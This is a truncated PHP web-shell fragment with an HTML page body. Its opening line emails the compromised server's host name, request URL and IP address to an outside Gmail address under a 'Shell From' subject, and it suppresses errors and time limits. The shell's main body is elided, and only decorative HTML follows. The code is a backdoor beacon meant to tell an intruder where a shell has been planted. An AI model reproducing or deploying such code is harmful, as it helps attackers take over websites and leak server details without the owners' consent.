<?php
mail("dewiularpepek@gmail.com","Shell From ".$_SERVER['HTTP_HOST'],"Direct Link : ".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."\nInfo : ".$info."\nIP : ".$_SERVER['SERVER_ADDR']."\n");
set_time_limit(0);
error_reporting(0);
...
<BODY>
<center><img src="https://www.livetekno.com/wp-content/uploads/www.livetekno.com/wp-content/uploads/2017/04/dp-bbm-bismillah-gerak.png"></center>
<H1><center>-</center></H1>
<body background="http://reminiscance.files.wordpress.com/2011/08/bintang-berbeda.gif">
